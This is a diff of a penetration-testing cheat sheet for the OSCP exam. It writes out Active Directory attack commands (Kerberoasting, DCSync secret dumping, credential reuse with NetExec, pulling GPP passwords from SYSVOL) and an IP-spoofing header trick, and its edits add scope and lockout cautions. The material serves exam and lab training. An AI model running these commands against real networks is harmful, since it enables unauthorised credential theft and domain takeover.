+impacket-GetUserSPNs "$DOMAIN/$AUTH_USER" -dc-ip "$DC_IP" -request -outputfile kerberoast.txt  # password prompt; avoids @/: parser ambiguity
 
 # Validate an evidence-derived credential against one justified host first:
 nxc smb "$TARGET_HOST" -u "$CANDIDATE_USER" -p "$CANDIDATE_PASS" -d "$DOMAIN"
 
 # If DCSync is proven, collect only the required account first:
-impacket-secretsdump -just-dc-user "$DCSYNC_USER" -dc-ip "$DC_IP" -outputfile "dcsync-$DCSYNC_USER" "$DOMAIN/$AUTH_USER:$AUTH_PASS@$DC"
+impacket-secretsdump -just-dc-user "$DCSYNC_USER" -dc-ip "$DC_IP" -outputfile "dcsync-$DCSYNC_USER" "$DOMAIN/$AUTH_USER@$DC"
 ```
 
 
@@ -9169,7 +9308,7 @@ sudo nmap -Pn -n -p- --min-rate 1000 -oA ~/oscp/$IP/scans/tcp-all $IP
       ✗ Not documenting the exact exploit used
       ✗ Missing screenshots of privilege escalation steps
       ✗ Not noting every command that led to compromise
-      ✗ Forgetting local.txt (user flag) — it's 10 pts!
+      ✗ On a stand-alone, forgetting local.txt can leave 10 points unclaimed
 
     MENTAL MISTAKES:
       ✗ Spending > 20–30 min on one attack path with no new evidence or precise cheap prerequisite
@@ -9229,6 +9368,8 @@ sudo nmap -Pn -n -p- --min-rate 1000 -oA ~/oscp/$IP/scans/tcp-all $IP
     [ ] Modified exploit: include modified code + original URL + highlighted changes/explanation
     [ ] PDF filename: OSCP-OS-XXXXX-Exam-Report.pdf
     [ ] Archive to: OSCP-OS-XXXXX-Exam-Report.7z (NO password)
+        7z a OSCP-OS-XXXXX-Exam-Report.7z OSCP-OS-XXXXX-Exam-Report.pdf
+        7z l OSCP-OS-XXXXX-Exam-Report.7z   # confirm ONLY the final PDF is inside
     [ ] Create the .7z on Kali; archive contains only the final PDF; max upload size 200 MB
     [ ] Visually reopen/review the final exported PDF for formatting errors
     [ ] Upload within 24 hours at upload.offsec.com
@@ -9315,7 +9456,7 @@ CHECK TRUST / AD RELATIONSHIPS
 
 </details>
 
-## 🔥 BONUS: MOST MISSED TRICKS
+## 🔥 MOST MISSED TRICKS
 
 
 <details>
@@ -9331,11 +9472,11 @@ CHECK TRUST / AD RELATIONSHIPS
 ``` bash
 # ── ALWAYS CHECK THESE (commonly missed) ─────────────────────
 
-# 1. Credential fan-out across APPROPRIATE, EXPOSED, IN-SCOPE services
+# 1. Credential reuse — ONE justified host/service first
 # Record provenance and check lockout policy first. Authentication != authorization.
-nxc smb   $TARGETS -u "$USER" -p "$PASS" -d "$DOMAIN" --continue-on-success
-nxc winrm $TARGETS -u "$USER" -p "$PASS" -d "$DOMAIN"
-# Add RDP/LDAP/MSSQL/SSH/web only where that service is actually exposed.
+nxc smb   $IP -u "$USER" -p "$PASS" -d "$DOMAIN"
+nxc winrm $IP -u "$USER" -p "$PASS" -d "$DOMAIN"
+# Expand only after reachability/service evidence or Credential Debt says it is worth testing.
 
 # 2. /etc/crontab AND /var/spool/cron/crontabs — different locations!
 cat /etc/crontab /etc/cron.d/* /var/spool/cron/crontabs/* 2>/dev/null | grep -v "^#"
@@ -9377,10 +9518,10 @@ grep -E 'root|UID=0' /tmp/pspy.log | grep -v pspy
 mysql -u root -p -e "SHOW variables LIKE 'secure_file_priv';"
 
 # 11. GPP passwords in SYSVOL (if you have any domain user creds):
-nxc smb $DC -u user -p pass -M gpp_password
-nxc smb $DC -u user -p pass -M gpp_autologin
+nxc smb $DC -u "$AUTH_USER" -p "$AUTH_PASS" -d "$DOMAIN" -M gpp_password
+nxc smb $DC -u "$AUTH_USER" -p "$AUTH_PASS" -d "$DOMAIN" -M gpp_autologin
 # Manual:
-smbclient //DC/SYSVOL -U user%pass
+smbclient "//$DC/SYSVOL" -U "$DOMAIN/$AUTH_USER"   # password prompt
 # find Groups.xml and decrypt with: gpp-decrypt "HASH"
 
 # 12. Unattended install files (Windows — forgotten by admins):
@@ -9512,7 +9653,7 @@ X-Remote-Addr: 127.0.0.1
 - OSCP Candidate Handbook (updated 31 Jul 2026): https://help.offsec.com/hc/en-us/articles/40393367449108-OSCP-Candidate-Handbook
 - OSCP Reporting Requirements (updated 06 Aug 2026): https://help.offsec.com/hc/en-us/articles/360046787731-OSCP-Reporting-Requirements
 
-**Snapshot checked 06 Sep 2026. Re-check these official pages immediately before your exam.** If these notes conflict with the current guide, policy, control-panel instructions or proctor direction, those current sources win.
+**Rule snapshot checked 23 Sep 2026. Re-check these official pages immediately before your exam.** If these notes conflict with the current guide, policy, control-panel instructions or proctor direction, those current sources win.
 
 ### Vulnerability Intelligence
 
@@ -9537,7 +9678,7 @@ X-Remote-Addr: 127.0.0.1
 -   NetExec certificate auth: https://github.com/Pennyw0rth/NetExec-Wiki/blob/main/getting-started/using-certificates.md
 -   Microsoft PowerShell remoting security (authentication and authorization context): https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/winrm-security?view=powershell-7.6
 -   Certipy releases (5.1.0 stable snapshot): https://github.com/ly4k/Certipy/releases
--   BloodHound releases (9.6.0 stable snapshot): https://github.com/SpecterOps/BloodHound/releases
+-   BloodHound/Kali package state (checked 23 Sep 2026): https://pkg.kali.org/pkg/bloodhound/news/
 -   Impacket 0.13.1 release/changelog: https://github.com/fortra/impacket/releases/tag/impacket_0_13_1
 -   PayloadsAllTheThings:
     https://github.com/swisskyrepo/PayloadsAllTheThings
